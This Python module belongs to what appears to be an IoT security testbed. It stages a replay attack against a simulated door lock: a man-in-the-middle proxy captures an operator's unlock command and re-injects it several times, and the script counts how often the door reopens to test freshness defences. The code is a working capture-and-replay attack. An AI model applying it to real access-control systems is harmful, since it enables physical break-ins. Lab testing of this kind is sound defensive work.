"""
module1_attacks/replay.py - Re-send a captured "unlock" command (freshness attack).

Story: the attacker records the cloud's traffic while the operator legitimately
unlocks and then re-locks door lock-01. Later the attacker re-sends the
recorded unlock frame, byte for byte, inside the cloud's own connection.
The attacker never needs to read or understand the frame - if it was valid
once, a system without freshness checks will accept it again.

Measured: how many of the replays actually unlocked the door.
Expected defence in secure mode: timestamp window + nonce / sequence-number cache.
"""

import time

from config import BROKER_PORT, MITM_PORT
from module1_attacks.common import broker_reasons, make_result
from module1_attacks.mitm_proxy import MitmProxy

TARGET_LOCK = "lock-01"
REPLAYS = 5


def run(building):
    """Capture a legitimate unlock command, then replay it several times."""
    lock = building.device(TARGET_LOCK)
    bridge = building.bridge
    proxy = MitmProxy(MITM_PORT, BROKER_PORT).start()
    rejections_before = len(building.broker.rejections)
    successes = 0
    replays_sent = 0
    try:
        building.reroute(bridge, MITM_PORT)

        # 1. Legitimate activity that the attacker records.
        bridge.send_command(TARGET_LOCK, "unlock", issued_by="operator1")
        time.sleep(0.3)
        bridge.send_command(TARGET_LOCK, "lock", issued_by="operator1")
        time.sleep(0.3)

        # 2. The attacker picks the first command frame sent to the lock
        #    (it knows from timing that the door was opened first).
        commands = [(link, raw) for link, frame, raw in proxy.frames("up", "publish")
                    if str(frame.get("topic", "")).endswith(f"{TARGET_LOCK}/cmd")]
        if not commands:
            return make_result("replay", building.mode, 0, 0, "",
                               "no command frame could be captured")
        link, unlock_frame = commands[0]

        # 3. Replay it and watch whether the door opens again.
        time.sleep(1.1)                    # the frame is now a little "old"
        for _ in range(REPLAYS):
            before = lock.unlock_count
            proxy.inject(link, unlock_frame)
            replays_sent += 1
            time.sleep(0.3)
            if lock.unlock_count > before:
                successes += 1
    finally:
        building.reroute(bridge, BROKER_PORT)
        proxy.stop()
        bridge.send_command(TARGET_LOCK, "lock", issued_by="system")   # leave the door locked
        time.sleep(0.2)

    evidence = (f"replayed captured unlock frame {replays_sent}x; door unlocked "
                f"{successes}x; lock rejected {lock.rejected_commands} commands in total")
    defence = "" if successes else (broker_reasons(building, rejections_before)
                                    or "replayed command ignored by the lock")
    return make_result("replay", building.mode, replays_sent, successes, defence, evidence)
